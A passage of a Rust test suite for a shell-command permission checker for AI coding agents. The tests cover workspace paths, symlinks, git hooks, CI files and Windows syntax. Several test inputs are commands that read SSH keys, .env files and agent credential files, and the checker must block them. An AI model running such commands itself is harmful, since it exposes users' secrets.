            ("pip -q install -r requirements.txt", "pip"),
            ("cargo --locked test", "cargo"),
            ("cargo -Zunstable-options test", "cargo"),
            ("uv --directory sub sync", "uv"),
            ("go -C sub test", "go"),
            ("make -j4 build", "make"),
            ("make -C sub build", "make"),
            ("brew --prefix", "brew"),
            ("gh -R owner/repo pr view 1", "gh"),
            ("npm -ddd test", "npm"),
        ] {
            assert_eq!(rules_for(line), [rule(line, true)], "{line}");
            assert!(allows(line, false, &rules_for(line)), "{line}");
            assert!(!allows(line, false, &[rule(loose, false)]), "{line}");
            assert!(!auto(line), "{line}");
        }
        // The flags a rule's words already account for still give a loose one.
        assert_eq!(rules_for("make build"), [rule("make build", false)]);
        assert_eq!(
            rules_for("cargo +nightly test"),
            [rule("cargo test", false)]
        );
        assert_eq!(
            rules_for("pnpm --filter app build"),
            [rule("pnpm build", false)]
        );
    }

    #[test]
    fn a_loose_rule_covers_only_paths_inside_the_folders() {
        let rules = [rule("ls", false), rule("cat", false), rule("wc", false)];
        for line in [
            "ls /tmp",
            "cat /etc/hosts",
            "cat ../other/a.rs",
            "wc -l ~/notes.txt",
            "ls src && cat /etc/hosts",
        ] {
            for mode in [false, true] {
                assert!(!allows(line, mode, &rules), "{line} in Auto {mode}");
            }
            assert!(allows(line, false, &rules_for(line)), "{line}");
        }
        assert!(allows("ls src", false, &rules));
        assert!(allows("cat src/a.rs && wc -l src/a.rs", false, &rules));
    }

    #[test]
    fn a_risky_program_keeps_its_exact_words() {
        for line in [
            "sqlite3 db.sqlite .dump",
            "man ls",
            "csh -c ls",
            "tcsh -c ls",
            "lua x.lua",
            "tclsh x.tcl",
            "expect x.exp",
            "defaults read com.apple.finder",
            "plutil -p x.plist",
            "ditto a b",
            "touch x",
            "xattr -l x",
            "mkdir -p out",
            "pbpaste",
            "screencapture x.png",
        ] {
            assert_eq!(rules_for(line), [rule(line, true)], "{line}");
            let program = line.split(' ').next().unwrap();
            for mode in [false, true] {
                assert!(
                    !allows(line, mode, &[rule(program, false)]),
                    "{line} in Auto {mode}"
                );
            }
        }
    }

    #[test]
    fn git_reads_no_secret_from_history_or_the_index() {
        let lines = [
            "git grep --no-index -e. .env",
            "git grep -e. -- .env",
            "git grep -e foo -e bar .env",
            "git grep -e. HEAD -- id_rsa",
            "git grep foo -- .env",
            "git grep -n -e foo .env.local",
            "git show HEAD:.env",
            "git show :.env",
            "git show :0:.env",
            "git show HEAD:config/.env.local",
            "git show main:.ssh/id_rsa",
            "git cat-file -p HEAD:.env",
            "git cat-file blob HEAD:credentials.json",
            "git diff HEAD:.env HEAD~1:.env",
            "git log -p -- .env",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        let rules = [
            rule("git grep", false),
            rule("git show", false),
            rule("git cat-file", false),
            rule("git diff", false),
            rule("git log", false),
        ];
        assert_eq!(passing(&lines, &rules), [""; 0]);
        for line in [
            "git grep -e credentials src",
            "git grep -e foo",
            "git grep -n -e foo -- src",
            "git show HEAD:src/main.rs",
            "git show HEAD~1:README.md",
            "git log --format=%h:%s",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    /// The folders of an agent that works in the home folder `/home/you`, with
    /// MaxHQ's data in the two usual places.
    fn home() -> Folders {
        Folders::with_data(
            Path::new("/home/you"),
            Path::new("/home/you/Library/Application Support/MaxHQ/attachments/a1"),
            false,
            vec![
                PathBuf::from("/home/you/Library/Application Support/MaxHQ"),
                PathBuf::from("/home/you/.local/share/maxhq"),
            ],
        )
    }

    #[test]
    fn sign_ins_and_maxhq_data_ask_from_the_home_folder_too() {
        let home = home();
        let rules = [rule("cat", false), rule("ls", false), rule("head", false)];
        for line in [
            "cat .claude/.credentials.json",
            "cat .codex/auth.json",
            "cat 'Library/Application Support/MaxHQ/secrets/chatgpt.json'",
            "cat .cursor/cli-config.json",
            "cat /home/you/.codex/auth.json",
            "cat .local/share/maxhq/keys/agents/lead.key",
            "ls 'Library/Application Support/MaxHQ'",
            "head -c 100 'Library/Application Support/MaxHQ/maxhq.db'",
            "cat /home/you/.local/share/maxhq/maxhq.db",
            "cat .config/gh/hosts.yml",
            "cat .config/maxhq/ssh/id",
            "cat .tauri/maxhq.key",
            "cat .appstoreconnect/AuthKey.p8",
            "cat build/session.token",
            "cat secrets/x.json",
            "cd Library && cat 'Application Support/MaxHQ/secrets/cursor.json'",
            "cat /home/you/Library/Application\\ Support/MaxHQ/attachments/a2/x.png",
        ] {
            for mode in [false, true] {
                assert!(
                    !super::allows(line, mode, &rules, &home),
                    "{line} in Auto {mode}"
                );
            }
            let saved = super::rules_for(line, &home);
            assert!(saved.iter().all(|rule| rule.exact), "{line}: {saved:?}");
        }
        // The agent's own attachments, kept in the data folder, still read.
        for line in [
            "cat '/home/you/Library/Application Support/MaxHQ/attachments/a1/x.png'",
            "cat notes.txt",
            "ls -la Documents",
        ] {
            assert!(super::allows(line, true, &[], &home), "{line}");
        }
    }

    #[test]
    fn a_projects_own_cli_settings_ask() {
        for line in [
            "cat .claude/settings.json",
            "cat /work/ws/.claude/settings.json",
            "cat .codex/config.toml",
            "ls .cursor",
            "cat sub/.claude/CLAUDE.md",
        ] {
            assert!(!auto(line), "{line}");
            assert!(
                !allows(line, false, &[rule("cat", false), rule("ls", false)]),
                "{line}"
            );
        }
    }

    #[test]
    fn a_change_inside_git_or_maxhq_data_asks() {
        let work = Folders::with_data(
            Path::new("/work/ws"),
            Path::new("/data/maxhq/attachments/a1"),
            false,
            vec![PathBuf::from("/data/maxhq")],
        );
        for path in [
            ".git/config",
            ".git/hooks/pre-commit",
            "sub/.git/hooks/post-checkout",
            "/work/ws/.git/info/attributes",
            "/data/maxhq/maxhq.db",
            "/data/maxhq/attachments/a2/x.png",
            ".claude/settings.json",
        ] {
            assert!(!work.may_change(path), "{path}");
        }
        for path in [
            "src/main.rs",
            ".gitignore",
            "/data/maxhq/attachments/a1/x.png",
        ] {
            assert!(work.may_change(path), "{path}");
        }
        // A folder kept inside the workspace's `.maxhq` still counts as in it.
        let kept = Folders::with_data(
            Path::new("/work/ws"),
            Path::new("/work/ws/.maxhq/a1"),
            false,
            Vec::new(),
        );
        assert!(!kept.may_change("/work/ws/.maxhq/a1/note"));
        assert!(!kept.may_change(".maxhq/a1/note"));
    }

    #[test]
    fn hooks_ci_and_task_files_name_their_kind_and_others_none() {
        let work = folders();
        for (path, kind) in [
            (".husky/pre-commit", EditKind::GitHooks),
            ("/work/ws/.githooks/pre-push", EditKind::GitHooks),
            ("lefthook.yml", EditKind::GitHooks),
            (".lefthook-local.toml", EditKind::GitHooks),
            (".lefthook/pre-commit/lint.sh", EditKind::GitHooks),
            (".pre-commit-config.yaml", EditKind::GitHooks),
            (".github/workflows/ci.yml", EditKind::CiWorkflows),
            (".github/actions/setup/action.yml", EditKind::CiWorkflows),
            (".GitLab-CI.yml", EditKind::CiWorkflows),
            (".circleci/config.yml", EditKind::CiWorkflows),
            (".buildkite/pipeline.yml", EditKind::CiWorkflows),
            ("azure-pipelines.yml", EditKind::CiWorkflows),
            ("Jenkinsfile", EditKind::CiWorkflows),
            (".vscode/tasks.json", EditKind::EditorTasks),
            (".vscode/launch.json", EditKind::EditorTasks),
            (".zed/tasks.json", EditKind::EditorTasks),
            (".idea/runConfigurations/App.xml", EditKind::EditorTasks),
            (".pnpmfile.cjs", EditKind::PackageHooks),
            (".yarnrc.yml", EditKind::PackageHooks),
            (".yarn/releases/yarn-4.5.0.cjs", EditKind::PackageHooks),
            (".gitmodules", EditKind::GitSettings),
            ("sub/.gitattributes", EditKind::GitSettings),
            (".devcontainer/devcontainer.json", EditKind::DevContainer),
            (".devcontainer.json", EditKind::DevContainer),
        ] {
            assert!(work.may_change(path), "{path} passes may_change");
            assert_eq!(work.runs_later(path), Some(kind), "{path}");
        }
        for path in [
            "src/main.rs",
            "AGENTS.md",
            "CLAUDE.md",
            "sub/AGENTS.md",
            ".cursorrules",
            ".github/copilot-instructions.md",
            ".github/CODEOWNERS",
            ".vscode/settings.json",
            ".yarn/cache/x.zip",
            "docs/lefthook.md",
            ".gitignore",
        ] {
            assert_eq!(work.runs_later(path), None, "{path}");
            assert!(work.may_change(path), "{path}");
        }
        // `.npmrc` can hold a token, so it asks as a secret instead.
        assert!(!work.may_change(".npmrc"));
        // The folder's own path doesn't count, as with may_change.
        let nested = Folders::new(
            Path::new("/work/.husky/ws"),
            Path::new("/work/attached"),
            false,
        );
        assert_eq!(nested.runs_later("/work/.husky/ws/src/main.rs"), None);
        assert_eq!(
            nested.runs_later("/work/.husky/ws/.husky/pre-commit"),
            Some(EditKind::GitHooks)
        );
    }

    #[test]
    #[cfg(unix)]
    fn a_hook_file_counts_where_its_link_leads() {
        let base = crate::testing::TempDir::new();
        let ws = std::fs::canonicalize(base.path()).unwrap();
        std::fs::create_dir_all(ws.join(".husky")).unwrap();
        std::os::unix::fs::symlink(".husky", ws.join("hooks")).unwrap();
        let folders = Folders::new(&ws, &ws.join("attached"), true);
        assert_eq!(
            folders.runs_later("hooks/pre-commit"),
            Some(EditKind::GitHooks)
        );
        assert_eq!(folders.runs_later("src/main.rs"), None);
    }

    #[test]
    fn a_glob_that_could_spell_a_list_flag_asks() {
        for line in ["wc -l *", "wc -l *.md", "du -sh *", "du -sh ?.txt"] {
            assert!(!auto(line), "{line}");
            assert!(
                !allows(line, false, &[rule("wc", false), rule("du", false)]),
                "{line}"
            );
        }
        for line in ["wc -l src/*.rs", "wc -l -- *.md", "du -sh src/*.md"] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    #[cfg(unix)]
    fn a_path_counts_where_its_links_lead() {
        let base = std::env::temp_dir().join(format!("maxhq-links-{}", std::process::id()));
        let ws = base.join("ws");
        std::fs::create_dir_all(ws.join("src")).unwrap();
        std::fs::create_dir_all(ws.join(".git/hooks")).unwrap();
        std::fs::create_dir_all(base.join("outside")).unwrap();
        std::fs::write(base.join("outside/notes.txt"), "x").unwrap();
        let ws = std::fs::canonicalize(&ws).unwrap();
        let link = |target: &str, name: &str| {
            std::os::unix::fs::symlink(target, ws.join(name)).unwrap();
        };
        link("../outside", "out");
        link("../../..", "root");
        link(".git/hooks", "hooks");
        link("src", "code");
        link("loop", "loop");
        link("missing/a", "ahead");
        link("/nowhere-maxhq-test/a", "far");
        let folders = Folders::new(&ws, &ws.join("attached"), true);
        let ok = |line: &str| super::allows(line, true, &[], &folders);
        for line in [
            "cat code/main.rs",
            "cat src/main.rs",
            "cat ahead",
            "cd code && cat main.rs",
        ] {
            assert!(ok(line), "{line}");
        }
        for line in [
            "cat out/notes.txt",
            "ls root/etc",
            "cat root",
            "cat loop",
            "cat far",
            "cd out && cat notes.txt",
            "cd root && ls",
            "cd code && cat ../../outside/notes.txt",
        ] {
            assert!(!ok(line), "{line}");
            assert!(
                !super::allows(
                    line,
                    false,
                    &[rule("cat", false), rule("ls", false)],
                    &folders
                ),
                "{line}"
            );
        }
        assert!(!folders.may_change("hooks/pre-commit"));
        assert!(!folders.may_change("out/notes.txt"));
        assert!(!folders.may_change("loop"));
        assert!(folders.may_change("code/main.rs"));
        // A chain longer than the kernel follows counts as outside.
        let mut name = String::from("src");
        for at in 0..MOST_LINKS + 1 {
            let next = format!("hop{at}");
            link(&name, &next);
            name = next;
        }
        assert!(!ok(&format!("cat {name}/main.rs")));
        assert!(ok("cat hop0/main.rs"));
        std::fs::remove_dir_all(&base).unwrap();
    }

    /// The folders, read as PowerShell and `cmd.exe` read a line.
    fn windows() -> Folders {
        Folders {
            syntax: Syntax::Windows,
            ..folders()
        }
    }

    fn windows_words(line: &str) -> Result<Vec<Part>, Refusal> {
        Ok(read(line, Syntax::Windows)?
            .into_iter()
            .map(|command| command.words)
            .collect())
    }

    #[test]
    fn windows_reads_a_backslash_as_a_folder_separator() {
        let auto = |line: &str| super::allows(line, true, &[], &windows());
        assert_eq!(
            windows_words(r"cat src\main.rs; git.exe status").unwrap(),
            [vec!["cat", "src/main.rs"], vec!["git", "status"]]
        );
        assert!(auto(r"cat src\main.rs"));
        assert!(auto(r"git.exe log -n 3"));
        assert!(auto(r"rg -n needle 'src\drive'"));
        // A backslash that climbs out still reads as outside.
        assert!(!auto(
            r"cat ..\..
otes.txt"
        ));
        assert!(!auto(
            r"cat src\..\..
otes.txt"
        ));
        assert!(!auto(r"cat .ssh\id_ed25519"));
        // On sh the same backslashes escape, as before.
        assert_eq!(words(r"cat src\main.rs"), [vec!["cat", "srcmain.rs"]]);
    }

    #[test]
    fn windows_asks_about_what_powershell_or_cmd_would_expand() {
        for line in [
            "echo `whoami`",
            "echo a`nb",
            "echo ^& calc",
            "type %USERPROFILE%/.ssh/id_rsa",
            "ls | % name",
            "ls @args",
            "cat 'notes[1].txt'",
            "cat .ss[h]/id_rsa",
            "cat 'it''s.txt'",
            r#"echo "say ""hi""""#,
            r#"grep "a\" b" notes.txt"#,
            "cat '.ss?/id_rsa'",
            r#"cat "*.env""#,
            "cat '{a,b}.txt'",
        ] {
            assert_eq!(windows_words(line), Err(Refusal::Expansion), "{line}");
            assert!(!super::allows(line, true, &[], &windows()), "{line}");
        }
        // Windows has no /dev/null, so that's a file too, while another
        // descriptor is fine.
        assert_eq!(windows_words("ls > /dev/null"), Err(Refusal::Output));
        assert_eq!(windows_words("ls > NUL"), Err(Refusal::Output));
        assert!(windows_words("ls 2>&1").is_ok());
        assert_eq!(
            windows_words("runas /user:admin cmd"),
            Err(Refusal::OtherUser)
        );
        // A glob outside quotes is still read as one.
        assert!(super::allows("ls src/*.rs", true, &[], &windows()));
        assert!(!super::allows("cat .ss*/id_rsa", true, &[], &windows()));
    }

    #[test]
    fn windows_keeps_its_own_risky_commands_exact() {
        let rules_for = |line: &str| super::rules_for(line, &windows());
        for line in [
            "del notes.txt",
            "rd /s build",
            "remove-item build",
            "copy a.txt b.txt",
            "iex calc",
            "start notepad",
            "build.cmd release",
            "setup.ps1",
            "pwsh -c ls",
            "cmd /c dir",
            "winget install thing",
            "reg add key",
        ] {
            assert_eq!(rules_for(line), [rule(line, true)], "{line}");
            let loose = line.split(' ').next().unwrap();
            let other = format!("{loose} other");
            assert!(
                !super::allows(&other, false, &[rule(loose, false)], &windows()),
                "{line}"
            );
        }
        // A program named with .exe saves the rule by its name.
        assert_eq!(rules_for("git.exe status"), [rule("git status", false)]);
        assert_eq!(rules_for("make.exe build"), [rule("make build", false)]);
        // sh keeps reading these as before.
        assert_eq!(
            super::rules_for("del notes.txt", &folders()),
            [rule("del", false)]
        );
    }

    #[test]
    fn an_absolute_path_resolves_from_its_own_root() {
        assert_eq!(root_of(Path::new("/work/ws")), Path::new("/"));
        assert_eq!(root_of(Path::new("work/ws")), Path::new(""));
    }
}
